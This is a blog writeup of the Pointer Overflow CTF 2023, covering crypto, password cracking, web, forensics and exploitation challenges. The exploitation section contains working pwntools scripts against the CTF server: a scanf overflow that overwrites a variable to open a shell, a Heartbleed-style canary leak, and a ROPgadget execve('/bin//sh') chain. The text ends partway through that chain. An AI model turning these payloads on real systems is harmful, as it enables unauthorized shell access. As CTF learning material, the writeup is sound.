---
title: "Pointer Overflow CTF 2023 Writeups"
date: 2024-01-22
description: Pointer Overflow CTF 2023 Writeups
tags: ['CTF']
toc: true
mathjax: yes
last_modified_at: 2024-03-20
header:
    teaser: "image/uwsp_2023/TimeisbutaWindow-sol1.png"
---

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

<font size="4">
<p> 
I found this CTF in <a href="https://en.wikipedia.org/wiki/Pepero_Day">Nov 11th</a>, 2023. My original plan for that day (and weekend) was to play <a href="https://ctftime.org/event/2073">0CTF/TCTF</a> with b01lers, but the organizers of that CTF postponed it to some other date because they wanted to have their CTF serve as a DEFCON qualifier (I do not know the details unfortunately, so don't quote me on this because I could be wrong). 
</p>

<p>So, I instead found a CTF that I can play by myself, because, why not :) </p>

<p>This CTF technically ended on Sep 21, 2023 (because they got a team that solved every challenge that day), but they decided to leave it open until Jan 21, 2024. I did a quick Google search and discovered that no writeup was posted online (at least on the day I looked up) except for one OSINT problem (<a href="https://medium.com/@tahabashir733/a-great-interior-desert-writeup-poctf-73a324ee8c4d">A Great Interior Desert</a>).</p>

<p>They have nine categories, each with three challenges. They had me when I saw separate categories for steganography and password cracking. They also had a pretty good range of problems: some challenges were solvable within a few hours (or even minutes), but some took me almost a month.</p>

<p>The <a href="https://pointeroverflowctf.com/">competition website</a> is still online, but the challenges are not anymore. Here is the CTFTime event page: <a href="https://ctftime.org/event/2026/">https://ctftime.org/event/2026/</a>.</p>

</font>

## Crypto

### Unquestioned and Unrestrained

<center>
<img src="/image/uwsp_2023/Unquestioned_an_Unrestrained.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>Looks so much like base64. </p>
</font>

<font size="4">
{% highlight python %}
import base64

flag_encoded = "cG9jdGZ7dXdzcF80MTFfeTB1Ml84NDUzXzQyM184MzEwbjlfNzBfdTV9"
print(base64.b64decode(flag_encoded))
# b'poctf{uwsp_411_y0u2_8453_423_8310n9_70_u5}'
{% endhighlight %}
</font>

<font size="4">
  <p><b>Flag: <code>poctf{uwsp_411_y0u2_8453_423_8310n9_70_u5}</code></b></p>
</font>


### A Pale, Violet Light

<center>
<img src="/image/uwsp_2023/A_Pale,_Violet_Light.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>This time, it looks so much like RSA. The modulus is very small that it can be factorized in less than a second. No thinking needed.</p>
</font>

<font size="4">
{% highlight python %}
import numpy as np
import sympy as sp
import math
import struct

# Taken from https://www.delftstack.com/howto/python/mod-inverse-python/
def extended_gcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, x, y = extended_gcd(b % a, a)
        return (g, y - (b // a) * x, x)
def mod_inverse(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError("Modular inverse does not exist")
    else:
        return x % m

# There should be a better/shorter way to do this, but I am too lazy to look up online xD
with open("APaleVioletLight.txt", "r") as f:
    for line in f:
        if line[0] == 'e':
            variable_name, variable_value = line.split("=")
            e = int(variable_value)
        elif line[0] == 'N':
            variable_name, variable_value = line.split("=")
            N = int(variable_value)
        elif line[0] == 'C':
            variable_name = 'C'
            variable_values = line[3:].split()
            variable_values = [int(i) for i in variable_values]
            C = variable_values

# print(e, N, C)
print(sp.primefactors(N)) # two factors

p, q = sp.primefactors(N)
phi_N = (p-1) * (q-1)
d = mod_inverse(e, phi_N) # 202559
print(d)
assert((e*d) % phi_N == 1)
M = [(c**d % N) for c in C]
print(M) # [112, 111, 99, 116, 102, 123, 117, 119, 115, 112, 95, 53, 51, 51, 107, 32, 52, 110, 100, 32, 121, 51, 32, 53, 104, 52, 49, 49, 32, 102, 49, 110, 100, 125]
M_chr = [chr(i) for i in M]
flag = str.join('', M_chr) 
print(flag) # poctf{uwsp_533k 4nd y3 5h411 f1nd}
flag = flag.replace(' ', '_') 
print(flag) # poctf{uwsp_533k_4nd_y3_5h411_f1nd}
{% endhighlight %}
</font>

<font size="4">
<p>I don't even know why my code is so long, I didn't notice it until now. Maybe some thinking was involved.</p>

  <p><b>Flag: <code>poctf{uwsp_533k_4nd_y3_5h411_f1nd}</code></b></p>
</font>

### Missing and Missed

<center>
<img src="/image/uwsp_2023/Missing_and_Missed.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>And now, this looks so much like <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfxxk</a> (censoring the profanity part just in case) and the phrase "cerebral fornication" in the challenge description gives it away. <a href="https://www.dcode.fr/en">dCode</a> also agrees.</p>
</font>

<center>
<img src="/image/uwsp_2023/MaM_sol1.png" width="85%" height="85%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/MaM_sol2.png" width="85%" height="85%">
</center>

<font size="4">
<p></p>
<p><b>Flag: <code>poctf{uwsp_219h7_w20n9_02_f0290773n}</code></b></p>
</font>

## Crack

### The Gentle Rocking of the Sun

<center>
<img src="/image/uwsp_2023/Gentle_Rocking.png" width="70%" height="70%">
</center>

<p></p>


<font size="4">
<p>After some searches, I discovered that the value on the post-it note is a SHA-1 hash of some string "<b>zwischen</b>".</p>
</font>

<center>
<img src="/image/uwsp_2023/Gentle_Rocking_sol1.png" width="85%" height="85%">
</center>

<p></p>

<font size="4">
<p><code>crack2.7z</code> is password protected, and typing in "<b>zwischen</b>" as the password unlocked the folder that consists of another folder, and so on.</p>
</font>

<center>
<img src="/image/uwsp_2023/Gentle_Rocking_sol2.png" width="70%" height="70%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/Gentle_Rocking_sol3.png" width="70%" height="70%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/Gentle_Rocking_sol4.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>The fact that it starts with p and o gives a vibe that this might be the flag. Let's try it out.</p>
</font>

<font size="4">
{% highlight python %}
import os

for root, dirs, files in os.walk("./"):
    print(root)
# ./2023/p/o/c/t/f/{uwsp_/c/4/1/1/f/0/2/n/1/4_/d/2/3/4/m/1/n/9/}
print(root.replace("/", "").replace(".2023",""))
# poctf{uwsp_c411f02n14_d234m1n9}
{% endhighlight %}
</font>

<font size="4">
<p></p>
<p><b>Flag: <code>poctf{uwsp_c411f02n14_d234m1n9}</code></b></p>
</font>


### With Desperation and Need

<center>
<img src="/image/uwsp_2023/With_Desperation_and_Need.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>The song that stuck in that person's head is "We Will Rock You" and this rings a bell that the infamous <code>rockyou.txt</code> file might be relevant here. </p>
</font>

<center>
<img src="/image/uwsp_2023/With_Desperation_sol1.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>There is only one password that starts with "gUn" in <code>rockyou.txt</code>. Now, install VerCrypt, open <code>crack3</code> with it and plug in this password.</p>
</font>

<center>
<img src="/image/uwsp_2023/With_Desperation_sol2.png" width="80%" height="80%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/With_Desperation_sol3.png" width="80%" height="80%">
</center>

<p></p>

<font size="4">
<p>Nice! That indeed was the password. This unlocks a folder called <code>filesfromdecrypted</code> which contains <code>flag.txt</code> that has the flag which is: </p>

<p><b>Flag: <code>poctf{uwsp_qu4n717y_15_n07_4bund4nc3} </code></b></p>
</font>

## Web

### We Rest Upon a Single Hope

<center>
<img src="/image/uwsp_2023/We_Rest_Upon_a_Single_Hope.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>This website takes an input and lets you submit it. Upon checking its source code, we can discover that it stores our input as <code>key</code> and returns the output of a function called <code>Zuul</code>, in particular <code>Zuul(key.value)</code>. </p>
</font>

<center>
<img src="/image/uwsp_2023/We_Rest_Upon_a_Single_Hope_sol1.png">
</center>

<p></p>

<font size="4">
    <p>So, what is this function? Apparently, it does something when the input is <code>v</code>.</p>
</font>

<center>
<img src="/image/uwsp_2023/We_Rest_Upon_a_Single_Hope_sol2.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
    <p>and whatever that is, it looks important.</p>
</font>

<center>
<img src="/image/uwsp_2023/We_Rest_Upon_a_Single_Hope_sol3.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
    <p>And funnily enough, <code>Zuul(v)</code> was the flag.</p>
</font>

<center>
<img src="/image/uwsp_2023/We_Rest_Upon_a_Single_Hope_sol4.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_1_4m_411_7h47_7h3r3_15_0f_7h3_m057_r341}</code></b></p>
</font>


### Vigil of the Ceaseless Eyes

<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>Opening the link, we reach a very distracting-looking website.</p>
</font>

<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes_sol0.png" width="60%" height="60%">
</center>

<p></p>

<font size="4">
    <p>So, let's just follow the hint directly. The hint says there might or might not be something in <code>/secret/flag.pdf</code> directory/file.</p>
</font>

<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes_sol0_2.png" width="60%" height="60%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes_sol1.png" width="60%" height="60%">
</center>

<p></p>

<font size="4">
    <p>We get something. I cannot open it, but it looks like the file definitely exists.</p>
</font>

<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes_sol2.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
    <p>Let's force download it. I still cannot open it, but the file definitely has something inside.</p>
</font>

<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes_sol4.png" width="50%" height="50%">
</center>

<p></p>

<font size="4">
    <p>Opening it with a text editor, however...</p>
</font>

<center>
<img src="/image/uwsp_2023/Vigil_of_the_Ceaseless_Eyes_sol5.png" width="50%" height="50%">
</center>

<p></p>

<font size="4">
    <p>works like a charm and we get our flag!</p>
</font>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_71m3_15_4n_1llu510n}</code></b></p>
</font>


### Quantity is Not Abundance

<center>
<img src="/image/uwsp_2023/Quantity_is_Not_Abundance.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>Opening the link, we again reach a very distracting-looking website.</p>
</font>

<center>
<img src="/image/uwsp_2023/Quantity_is_Not_Abundance_sol0-0.png" width="50%" height="50%">
</center>

<p></p>

<font size="4">
    <p>The description for this problem has a similar hint as the previous one: there might or might not be something in <code>/.secret/flag.txt</code> directory/file.</p>
</font>

<center>
<img src="/image/uwsp_2023/Quantity_is_Not_Abundance_sol0-1.PNG" width="60%" height="60%">
</center>
<center>
<img src="/image/uwsp_2023/Quantity_is_Not_Abundance_sol0-2.PNG" width="60%" height="60%">
</center>

<p></p>

<font size="4">
    <p>Unlike last time, we cannot open it because we do not have permission. This, however, apparently could be bypassed by forcing it to open.</p>
</font>

<center>
<img src="/image/uwsp_2023/Quantity_is_Not_Abundance_sol1.png" width="80%" height="80%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/Quantity_is_Not_Abundance_sol2.png" width="80%" height="80%">
</center>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_1_h4v3_70_1n5157}</code></b></p>
</font>


## Forensics

### If You Don't, Remember Me

<center>
<img src="/image/uwsp_2023/If_You_Don_t,_Remember_Me.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
    <p>That <code>DF1.pdf</code> file seems broken. As always, we try opening it with a text editor. </p>
</font>

<center>
<img src="/image/uwsp_2023/If_You_Don_t,_Remember_Me_sol1.png" width="95%" height="95%">
</center>
<p></p>
<font size="4">
    <p>Some very suspicious yet familiar string here.</p>
</font>
<center>
<img src="/image/uwsp_2023/If_You_Don_t,_Remember_Me_sol1-1.png" width="95%" height="95%">
</center>
<p></p>
<font size="4">
    <p>Nice. Ez.</p>
</font>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_w31c0m3_70_7h3_94m3}</code></b></p>
</font>

### A Petty Wage in Regret

<center>
<img src="/image/uwsp_2023/A _Petty_Wage_in_Regret.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
    <p>Here is <code>DF2.jpg</code>:</p>
</font>

<center>
<img src="/image/uwsp_2023/DF2.jpg" width="80%" height="80%">
</center>

<p></p>
<font size="4">
    <p>Although this picture seems normal (in the sense that it is not broken and cannot be opened), let's start by opening it with a text editor.</p>
</font>
<center>
<img src="/image/uwsp_2023/A _Petty_Wage_in_Regret_sol2.png" width="95%" height="95%">
</center>
<p></p>
<font size="4">
    <p>They even gave you the hint "ASCII" next to it. Anyway, that translates to:</p>
</font>
<center>
<img src="/image/uwsp_2023/A _Petty_Wage_in_Regret_sol2-1.png" width="95%" height="95%">
<p><font size="4"><code>::P1/2:: poctf{uwsp_7h3_w0rld_h4d</code></font></p>
</center>
<p></p>

<font size="4">
<p>So it looks like the second half of the flag is somewhere else. I don't see any other suspicious-yet-familiar strings in the text editor.</p>

<p>It turns out the answer might be closer than we think/thought. The picture <code>DF2.jpg</code> looks 'funny' in the sense that some parts are clearer than others. Drawing lines and dots along those parts gives us:</p>
</font>

<center>
<img src="/image/uwsp_2023/DF2_sol.png" width="80%" height="80%">

<p><font size="4"><code>::P2/2:: 17_f1257</code></font></p>
</center>

<p></p>

<font size="4">
<p>It is not very clear and hard to see at first sight (hence I am not a big fan of this chal). I found it helpful to inverse the color and play around with bit planes using <a href="https://georgeom.net/StegOnline/">StegOnline</a>. Also, I don't know why the second part of the flag does not come with "}" but trying it with "}" worked.</p>
</font>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_7h3_w0rld_h4d_17_f1257}</code></b></p>
</font>

### Better to Burn in the Light

<center>
<img src="/image/uwsp_2023/BetterBurn.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>This wasn't an easy chal.</p>

<p>Like I did for the two previous chals, I started by opening the <code>DF3.001</code> file with text editor. That evidently wasn't a good move, I was immediately greeted with a frozen screen asking me if I want to force quit the text editor. How fun.</p>

<p>Some online searches told me that I could change the file extension from <code>.001</code> to <code>.7z</code>. That worked like a charm!</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-7z.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>There are just so many files to go over. But the challenge description said "we're going to need to bring some of them back from the dead." So, we can start by focusing on the files in <code>$RECYCLE.BIN</code> folder. </p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-7z-bin.png" width="60%" height="60%">
</center>

<p></p>

<font size="4">
<p>I (still) see so many files: some meme-y pictures and a bunch of broken files. Had no idea where to start, I simply began by opening all these files with <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol1.png" width="90%" height="90%">
</center>

<p></p>

<font size="4">
<p>This file doesn't seem very helpful. (Btw, there were A BUNCH of files that looked like this.) But these two look mildly interesting.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol2.png" width="90%" height="90%">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/BetterBurn-sol3.png" width="90%" height="90%">
</center>

<p></p>

<font size="4">
<p>That <code>$R4K6JU8.doc</code> file apparently was supposed to be a jpg file or is a file that contains a jpg file. Luckily, our chef is versatile enough to extract a file from a bigger file.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol4.png">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/BetterBurn-sol5.png" width="90%" height="90%">
</center>

<p></p>

<font size="4">
<p>Looks severely like a severely damaged flag part. Not happy, but at least we found something. Let's see if there is anything that is worth our attention. </p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol5-2.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>We've seen <code>$RLLD6JM.pdf</code> already, but there alledgedly is another file (named <code>$RN367L5.jpg</code>) that we overlooked. Let's ask our chef for another help.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol6.png">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/BetterBurn-sol7.png">
</center>
<p></p>
<center>
<img src="/image/uwsp_2023/BetterBurn-sol8.png" width="90%" height="90%">
</center>

<p></p>

<font size="4">
<p>Gosh, another severely damaged flag part? On the fortunate side, this part looks like the first part (starts with "poctf{") and the other part that we found before must be the other part (ends with "}"). But they are just, too blurry to be legible, almost like some of my students' handwritings (just kidding).</p>

<p>If you may recall, we had a weird-looking file (<code>$RLLD6JM.pdf</code>) that starts with a questionable string <code>--POCTF{0.5c} --</code>. Would that mean anything? </p>

<p>Apparently... the <code>$RN367L5.jpg</code> file has these strings in its head and tail, respectively:</p>

</font>

<center>
<font size="4">
    <p><code> CLUE 2 - 1 / 2 == 0.5a | 0.5b && 0.5a / 2 == 0.5a | 0.5c </code></p>
    <p><code> --POCTF{NOT THE END}-- </code></p>
</font>
</center>

<font size="4">
<p>I honestly, even till this date, have no idea what that first string exactly means, but it gives some impression that something must be combined with <code>0.5c</code> which, as we just recalled, is what <code>$RLLD6JM.pdf</code> starts with!</p>

<p>So, I copy pasted <code>$RLLD6JM.pdf</code> at the end of <code>$RN367L5.jpg</code>,</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol10.png">
</center>

<p></p>

<font size="4">
<p>and removed the garbage (?) parts:</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol11.png">
</center>

<p></p>

<font size="4">
<p>Boom!</p>

<p>Now for the second flag, which was from <code>$R4K6JU8.doc</code>, it just says <code>CLUE 1 - Missing header</code> at the top.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol12.png">
</center>

<p></p>

<font size="4">
<p>I wasn't sure what this meant until I took a look at another JPG file.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol13.png">
</center>

<p></p>

<font size="4">
<p>Yes, when it said missing header, it really meant it. I copy pasted the missing part, and my life is good now.</p>
</font>

<center>
<img src="/image/uwsp_2023/BetterBurn-sol14.png">
</center>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_5h1v3r_m3_71mb3r5}</code></b></p>

<p>I also tried solving this problem using TestDisk (since <code>DF3.001</code> file is a disk file, it was a canonical attempt). It could only recover a half of the flag, but not the other half. I think this chal was very well-made in that sense --- it does not get trivialized by the uses of tools (well, I guess I should not deny that without CyberChef, I might have not been able to solve this problem this easily). </p>
</font>


## Exploit

<font size="4">
<p>Did they mean "Pwn"? Anyway...</p>
</font>

### My Friend, A Loathsome Worm

<font size="4">
<p>Uh, it looks like I forgot to save the challenge description. Sorry! :'(</p>
</font>

<font size="4">
<p>We are given a binary executable file <code>exploit1.bin</code>. I don't think I want to read this manually, so I put it into Ghidra, and this is what it returned (<code>main</code> function). </p>
</font>

<font size="4">
{% highlight C %}
void main(EVP_PKEY_CTX *param_1)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  int local_1c;
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_38 = 0x3332317473657547;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_1c = 999;
  init(param_1);
  printf("Welcome, you are logged in as \'%s\'\n",&local_38);
  do {
    while( true ) {
      while( true ) {
        printf("\nHow can I help you, %s?\n",&local_38);
        puts(" (1) Change username");
        puts(" (2) Switch to root account");
        puts(" (3) Start a debug shell");
        printf("Choice: ");
        iVar1 = get_int();
        if (iVar1 != 1) break;
        printf("Enter new username: ");
        __isoc99_scanf(&DAT_001020c6,&local_38);
      }
      if (iVar1 != 2) break;
      puts("Sorry, root account is currently disabled");
    }
    if (iVar1 == 3) {
      if (local_1c == 999) {
        puts("Sorry, guests aren\'t allowed to use the debug shell");
      }
      else if (local_1c == 0x539) {
        puts("Starting debug shell");
        execl("/bin/bash","/bin/bash",0);
      }
      else {
        puts("Unrecognized user type");
      }
    }
    else {
      puts("Unknown option");
    }
  } while( true );
}
{% endhighlight %}
</font>

<font size="4">
<p>It looks like, if <code>local_1c</code> is equal to <code>0x539</code>, then we can get into the (root) shell. We can start writing from <code>local_38</code> and it uses <code>scanf()</code> function to scan and store <code>local_38</code>, which is a well-known vulnerable function.</p>

<p>The local relative address (on memory stack) of <code>local_38</code> is <code>0x38</code> and <code>local_1c</code> is <code>0x1c</code> (like their Ghidra-ed names say). Here is the screenshot of Ghidra, in case you don't trust me.</p>
</font>

<center>
<img src="/image/uwsp_2023/MyFriendALoathsomeWorm-ghidra.png">
</center>

<p></p>

<font size="4">
<p>So, our payload would be: <code>0x38 - 0x1c</code> many garbage bytes and <code>0x539</code>. In code (yes, I am finally using pwntools!), it'd look like this:</p>
</font>

<font size="4">
{% highlight python %}
import pwn

nc_ed = pwn.remote('34.123.210.162', '20232')

nc_ed.recvuntil(":")
nc_ed.sendline("1")
nc_ed.recvuntil(":")

payload = b'a' * (0x38 - 0x1c) + b'\x39\x05\x00\x00'
print(payload)

nc_ed.sendline(payload)
nc_ed.recvuntil(":")
nc_ed.sendline("3")

nc_ed.interactive()
{% endhighlight %}
</font>

<center>
<img src="/image/uwsp_2023/MyFriendALoathsomeWorm-sol.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_5w337_c10v32_4nd_50f7_511k}</code></b></p>
</font>


### A Guilded Lily

<font size="4">
<p>It again looks like I again forgot to save the challenge description again. Sorry again! :'(</p>
</font>

<font size="4">
<p>This chal wasn't particularly difficult (was not easy either, though), but it took me a while to actually get my code working. It also took me a while to understand the problem, especially the format of input. I also forgot exactly how I ended up using ROPgadget. I think the challenge description (which I clumsily did not save) said something about it, or that <code>/bin/sh</code> does not exist (or something along those lines).</p>
</font>

<font size="4">
<p>We are given a binary executable file <code>exploit2.bin</code>. Let Ghidra feast on it.</p>
</font>

<font size="4">
{% highlight C %}
// exploit2_ghidra_ed.c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  long in_FS_OFFSET;
  int local_41c;
  undefined local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  puts("Heartbleed Bug Simulator (CVE-2014-0160)");
  puts("  info: https://heartbleed.com/");
  do {
    puts("\nWaiting for heart beat request...");
    __isoc99_scanf(" %d:%s",&local_41c,local_418);
    puts("Sending heart beat response...");
    write(1,local_418,(long)local_41c);
  } while (0 < local_41c);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
void __stack_chk_fail(void)
{
                    /* WARNING: Subroutine does not return */
  __fortify_fail("stack smashing detected");
}
void __fortify_fail(undefined8 param_1)
{
  do {
    __libc_message(1,"*** %s ***: terminated\n",param_1);
  } while( true );
}
{% endhighlight %}
</font>

<font size="4">
<p>It looks like a toy example of the infamous Heartbleed vulnerability. The program takes a string and its length as input, and returns the string by reading the length-amount of its memory. Therefore, by giving the length that is actually longer than the input string, we have a chance of being able to read beyond the string, which could include the memory of the machine running the program. </p>

</font>

<font size="4">
<p>Let's pay attention to those two lines first (technically four, but two are more or less print statements, so you know what I mean):</p>
{% highlight C %}
// From exploit2_ghidra_ed.c
puts("\nWaiting for heart beat request...");
__isoc99_scanf(" %d:%s",&local_41c,local_418);
puts("Sending heart beat response...");
write(1,local_418,(long)local_41c);
{% endhighlight %}
<p>The program takes the length of the input and stores it as <code>local_41c</code>, and the string as <code>local_418</code> of length 1032 bytes, but using <code>scanf()</code> function! </p>

<p>Then, there is another local variable <code>local_10</code>. This is actually quite interesting.</p>
</font>

<font size="4">
{% highlight C %}
// from exploit2_ghidra_ed.c
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
{% endhighlight %}
</font>

<font size="4">
<p>It appears that if <code>local_10</code> is different from what it is supposed to be, the program returns fail. Ah, so <code>local_10</code> is the stack canary!</p>

<p>We can bypass the stack canary by figuring out its value, then overwrite it with its value when building our attack payload. We can have it print out <code>local_10</code>by filling up <code>local_418</code> with 1032 characters but giving it a length longer than 1032.</p>

{% highlight python %}
nc_ed = pwn.remote('34.123.210.162', '20233')
nc_ed.recvuntil("Waiting for heart beat request...")

payload = b'1048:' + b'a' * 1032 # 1032 + 16 = 1048
nc_ed.sendline(payload)

nc_ed.recvuntil("a" * 1032)
canary_ish_thingy = nc_ed.read(8) # signed long integer = 8 bytes
{% endhighlight %}

<p>I did +16 instead of +8 to see if I could also read the return address, but in the end, it was not very necessary---please keep reading if you are curious why :). </p>

<p>As a sanity check, I wanted to make sure that whether we actually reached and can overwrite <code>local_10</code>, and whether that <code>canary_ish_thingy</code> is in fact <code>local_10</code>. Let's first see if changing the value beyond <code>local_418</code> actually triggers the "smashing detection" system:
</p>
{% highlight python %}
payload += b'b' * 16
nc_ed.sendline(payload)
nc_ed.recvuntil("Waiting for heart beat request...")
nc_ed.sendline(b'0:a')
nc_ed.interactive() # *** stack smashing detected ***: terminated
{% endhighlight %}

<p>It very well does. Now let's see if overwriting it with our <code>canary_ish_thingy</code> works.
</p>
{% highlight python %}
payload += canary_ish_thingy
nc_ed.sendline(payload)
nc_ed.recvuntil("Waiting for heart beat request...")
nc_ed.sendline(b'1:a')
nc_ed.interactive() 
# It did. It returns Waiting for heart beat request...
# But apparently it sometimes end up getting an infinite loop?
{% endhighlight %}

<p>
I don't exactly know/remember what was happening, but it worked for the vast majority of the time. Anyway, our hypothesis that <code>local_10</code> is indeed the stack canary and overwriting it with itself could allow us to bypass the stack smashing detection system. 
</p>

<p>So, you'd probably think that we can put shellcode inside our buffer <code>local_418</code> and changing the return address to the address of the buffer would work, like this code does:
</p>
{% highlight python %}
new_payload = b'0:'
new_payload += shellcode
new_payload += b'a' * (1032 - len(shellcode))
new_payload += canary_ish_thingy
new_payload += b'b' * 16 # 8? 16?
new_payload += pwn.p32(0x00401ec1) # b'\xc1\x1e\x40\x00'

nc_ed.sendline(new_payload)
nc_ed.interactive()
{% endhighlight %}

<p>Apparently it does not. I spent all they thinking the address <code>0x00401ec1</code> was wrong, but both Ghidra and GDB gave me the same address. While being very confused, I remembered the <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented programming</a> (ROP) that I taught in CS 426 that I TAed. </p>

<p>I turned on ROPGadget and had it generate <code>execve</code> (ROP chain), set it as <code>shellcode</code>, and put it into where the return address is at:</p>

{% highlight python %}
new_payload = b'0:'
new_payload += b'a' * 1032
new_payload += canary_ish_thingy
new_payload += b'b' * 8
new_payload += shellcode

nc_ed.sendline(new_payload)
nc_ed.interactive()
{% endhighlight %}
</font>

<font size="4">
<p>It finally worked.</p>
</font>

<center>
<img src="/image/uwsp_2023/AGuildedLily-sol.png" width="80%" height="80%">
</center>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_4_57udy_1n_5c42137}</code></b></p>

<p>For completeness and viewing pleasure, here is the full <code>sol.py</code> script. It also includes the ROP chain generated by ROPgadget.</p>

</font>

<details>
<summary><font size="4"><code>sol.py</code> (Click to expand)</font></summary>
<font size="4">

{% highlight python %}
```python
#!/usr/bin/env python3
# execve generated by ROPgadget
import pwn
from Crypto.Util.number import long_to_bytes, bytes_to_long
from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0040f30e) # pop rsi ; ret
p += pack('<Q', 0x004df0e0) # @ .data
p += pack('<Q', 0x00451fd7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x00499b65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0040f30e) # pop rsi ; ret
p += pack('<Q', 0x004df0e8) # @ .data + 8
p += pack('<Q', 0x0044c190) # xor rax, rax ; ret
p += pack('<Q', 0x00499b65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x004018e2) # pop rdi ; ret
p += pack('<Q', 0x004df0e0) # @ .data
p += pack('<Q', 0x0040f30e) # pop rsi ; ret
p += pack('<Q', 0x004df0e8) # @ .data + 8
p += pack('<Q', 0x004017ef) # pop rdx ; ret
p += pack('<Q', 0x004df0e8) # @ .data + 8
p += pack('<Q', 0x0044c190) # xor rax, rax ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
